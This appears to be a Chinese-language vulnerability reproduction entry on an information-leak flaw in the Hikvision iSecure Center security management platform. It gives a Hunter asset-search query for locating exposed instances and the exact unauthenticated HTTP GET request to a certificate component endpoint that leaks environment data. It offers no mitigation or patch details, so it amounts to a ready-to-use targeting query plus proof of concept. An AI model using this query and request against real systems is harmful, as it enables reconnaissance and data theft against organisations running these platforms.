# 海康威视iSecure Center综合安防管理平台findcomponent泄漏漏洞

# 一、漏洞简介
HIKVISION 综合安防管理平台component存在信息泄漏漏洞，攻击者通过漏洞可以获取环境等敏感信息进一步攻击。

# 二、影响版本
+ HIKVISION 综合安防管理平台

# 三、<font style="color:rgb(0, 0, 0);">资产测绘</font>
**hunter查询语法：**

`app.name=="Hikvision 海康威视 iSecure Center"`

![1691858054561-aa88559b-46e0-4837-ae4c-6f3e9e3982c5.png](./img/4D8_uhrkeXQMXsJC/1691858054561-aa88559b-46e0-4837-ae4c-6f3e9e3982c5-549805.png)

+ 登录页面

![1691858046745-db2cadc6-9bde-4037-952f-2faf2537b85f.png](./img/4D8_uhrkeXQMXsJC/1691858046745-db2cadc6-9bde-4037-952f-2faf2537b85f-064945.png)

# 四、漏洞复现
```java
GET /bic/caService/v1/certificate/machine/component HTTP/1.1
Host: 
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36

```

![1717150497083-b4bc9797-1270-41b7-87c0-771eb6ad1051.png](./img/4D8_uhrkeXQMXsJC/1717150497083-b4bc9797-1270-41b7-87c0-771eb6ad1051-960575.png)



> 更新: 2024-06-01 11:04:37  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/qf3ftbtmhnukggpy>